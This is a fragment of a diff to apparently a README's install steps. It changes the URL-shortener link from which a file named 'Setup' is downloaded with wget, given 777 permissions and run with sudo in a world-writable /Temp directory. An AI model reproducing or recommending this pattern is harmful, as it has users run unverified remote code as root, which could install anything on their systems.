@@ -87,7 +87,7 @@
   - `sudo mkdir /Temp`
   - `sudo chmod 777 /Temp`
   - `cd /Temp`
-  - `wget yun.ir/uywun1 -O Setup`
+  - `wget yun.ir/s9oj9e -O Setup`
   - `sudo chmod 777 Setup`
   - `sudo ./Setup`
 
